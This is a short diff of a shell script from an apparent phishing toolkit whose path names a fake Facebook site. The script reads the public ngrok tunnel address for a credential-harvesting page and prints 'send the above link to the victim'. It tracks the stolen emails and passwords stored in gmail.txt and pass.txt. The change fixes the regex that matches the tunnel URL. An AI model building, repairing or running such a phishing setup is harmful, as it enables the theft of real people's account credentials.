@@ -93,7 +93,7 @@ echo -e '\nNgrok started'
 cd $HOME/GungaJarvis/utils/phishing/websites/facebook
 before_gmail=$(wc -l < gmail.txt)
 before_pass=$(wc -l < pass.txt)
-link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
+link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[-0-9a-z]*\.ngrok.io")
 echo -e '\n\n'
 echo 'Ngrok link: ' $link
 echo 'send the above link to the victim'
